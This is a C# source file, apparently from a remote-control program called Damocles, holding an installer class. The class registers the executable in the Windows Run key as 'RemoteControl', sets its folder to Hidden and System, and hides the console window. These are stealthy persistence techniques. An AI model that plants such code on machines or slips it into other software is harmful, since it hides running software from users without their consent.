using Microsoft.Win32;
using System.Reflection;
using Serilog;
using System.Runtime.InteropServices;

namespace Damocles;

internal static class Installer
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    private static void SetStartup(bool active = true)
    {
        var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        var dllPath = Assembly.GetEntryAssembly()!.Location;
        var fileName = Path.GetFileName(dllPath);

        if (active)
        {
            key!.SetValue(
                "RemoteControl", 
                dllPath.Replace(fileName, fileName.Replace(".dll", ".exe")));
        }
        else
        {
            key!.DeleteValue("RemoteControl", false);
        }
    }

    private static void SetDirectoryHidden(bool hidden)
    {
        var directory = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
        var info = new DirectoryInfo(directory!);

        if (hidden)
        {
            if (!info.Attributes.HasFlag(FileAttributes.Hidden))
            {
                info.Attributes |= FileAttributes.Hidden;
            }

            if (!info.Attributes.HasFlag(FileAttributes.System))
            {
                info.Attributes |= FileAttributes.System;
            }
        }
        else
        {
            if (info.Attributes.HasFlag(FileAttributes.Hidden))
            {
                info.Attributes &= ~FileAttributes.Hidden;
            }

            if (info.Attributes.HasFlag(FileAttributes.System))
            {
                info.Attributes &= ~FileAttributes.System;
            }
        }
    }

    public static void HideConsoleWindow()
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    public static void InstallFiles(bool useStartup, bool directoryHidden)
    {
        try
        {
            SetStartup(useStartup);
            Log.Information("Successfully set startup to {0}", useStartup);
        }
        catch (Exception e)
        {
            Log.Error("Failed to set startup {0}: {1}", useStartup, e);
        }

        try
        {
            SetDirectoryHidden(directoryHidden);
            Log.Information("Successfully set directory hidden to {0}", directoryHidden);
        }
        catch (Exception e)
        {
            Log.Error("Failed to set directory hidden {0}: {1}", directoryHidden, e);
        }
    }

}